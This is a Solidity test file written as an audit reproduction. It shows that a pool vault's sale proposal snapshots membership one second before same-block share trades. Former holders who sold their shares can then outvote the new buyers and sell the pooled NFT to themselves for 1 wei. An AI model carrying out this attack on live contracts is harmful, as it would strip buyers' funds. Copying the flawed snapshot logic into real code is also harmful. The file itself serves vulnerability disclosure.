// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {SaleTestBase} from "../utils/SaleTestBase.sol";
import {PoolVault} from "../../src/PoolVault.sol";
import {IPoolVault} from "../../src/interfaces/IPoolVault.sol";

/// @notice Local audit reproduction for ee8c809. Demonstrates existing behavior, not a fix.
/// No fork or real wallets. Funding, share trades, voting and NFT handover use production entry points.
contract AuditGovernance is SaleTestBase {
    function test_currentBuyersCanBeExcludedByPreTransferSnapshotBeforeVoteFreeze() public {
        // Remove test-only Vault extension; keep real storage and use an ordinary timelocked upgrade.
        PoolVault production = new PoolVault(address(poolFactory));
        bytes memory upgrade = abi.encodeWithSignature("upgradeTo(address)", address(production));
        bytes32 salt = keccak256("audit-production-implementation");
        vm.prank(OWNER);
        timelock.schedule(address(beacon), 0, upgrade, bytes32(0), salt, 48 hours);
        vm.warp(block.timestamp + 48 hours);
        timelock.execute(address(beacon), 0, upgrade, bytes32(0), salt);

        _transfer(BOB, CAROL, 23); // Prior holders: ALICE 49 / BOB 26 / CAROL 25.
        _readyForSale();
        vm.prank(ALICE);
        uint256 aliceOrder = shareMarket.list(address(pool), 49, 0.1 ether);
        vm.prank(BOB);
        uint256 bobOrder = shareMarket.list(address(pool), 25, 0.1 ether);
        vm.warp(block.timestamp + 1);
        uint256 transactionTimestamp = block.timestamp;

        // Two ordinary buyers fill valid orders before any proposal/freeze exists.
        vm.deal(DAVE, 10 ether);
        vm.deal(ERIN, 10 ether);
        vm.prank(DAVE);
        shareMarket.fill{value: 4.9 ether}(aliceOrder, 49);
        vm.prank(ERIN);
        shareMarket.fill{value: 2.5 ether}(bobOrder, 25);
        assertEq(pool.balanceOf(ALICE), 0);
        assertEq(pool.balanceOf(BOB), 1);
        assertEq(pool.balanceOf(DAVE) + pool.balanceOf(ERIN), 74);
        assertEq(shareMarket.bnbOwed(ALICE) + shareMarket.bnbOwed(BOB), 7.326 ether);

        // The proposal begins after those trades but snapshots the preceding timestamp.
        vm.prank(BOB);
        uint256 id = saleVault.propose(1, 0, 0);
        assertEq(saleVault.getProposal(id).snapshotTs, transactionTimestamp - 1);
        assertEq(saleVault.getProposal(id).snapshotMemberCount, 3);
        vm.prank(DAVE);
        vm.expectRevert(IPoolVault.NotMember.selector);
        saleVault.vote(id, false);
        vm.prank(ERIN);
        vm.expectRevert(IPoolVault.NotMember.selector);
        saleVault.vote(id, false);

        // Former holders have 1 current share together, yet retain 75 proposal votes and 2/3 addresses.
        vm.prank(ALICE);
        saleVault.vote(id, true);
        vm.prank(BOB);
        saleVault.vote(id, true);
        assertEq(saleVault.getProposal(id).yesShares, 75);
        assertEq(saleVault.getProposal(id).yesCount, 2);
        assertTrue(saleVault.proposalPassed(id));
        saleVault.executeSale(id);
        vm.deal(ALICE, 1);
        vm.prank(ALICE);
        saleVault.completeSale{value: 1}();

        assertEq(block.timestamp, transactionTimestamp, "all trades and sale can share one timestamp");
        assertEq(uint256(pool.state()), uint256(IPoolVault.State.Closed));
        assertEq(nft.ownerOf(rewardId), ALICE);
        assertEq(saleVault.saleProceeds(), 1);
        uint256 buyerProceeds = saleVault.pendingSaleProceeds(DAVE) + saleVault.pendingSaleProceeds(ERIN);
        assertLe(buyerProceeds, 1);
        emit log_named_uint("former holders' current shares", pool.balanceOf(ALICE) + pool.balanceOf(BOB));
        emit log_named_uint("former holders' effective proposal votes", saleVault.getProposal(id).yesShares);
        emit log_named_uint("buyers' payment in wei", 7.4 ether);
        emit log_named_uint("buyers' sale proceeds in wei", buyerProceeds);
        emit log_named_uint("miner sale price in wei", saleVault.saleProceeds());
    }
}
